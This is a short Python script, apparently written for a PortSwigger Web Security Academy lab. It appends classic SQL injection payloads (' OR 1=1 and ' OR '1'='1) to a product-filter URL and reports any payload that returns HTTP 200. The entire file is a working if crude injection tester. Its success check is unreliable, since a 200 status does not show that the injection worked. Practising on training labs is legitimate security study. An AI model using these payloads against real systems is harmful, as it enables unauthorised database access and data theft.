import requests


# error based sql injection using OR payload
Orpayloads= [" ' OR 1=1" ,
             " ' OR '1'='1" ]

def or_inj(url):
    print("trying error based inj pls wait...!")
    for i in range(0,len(Orpayloads)):
     r = requests.get(url+Orpayloads[i])
     if r.status_code == 200:
         print("{}worked".format(url + Orpayloads[i]))

url= 'https://0ad5003f0473729f85596388009300af.web-security-academy.net/filter?category=Pets'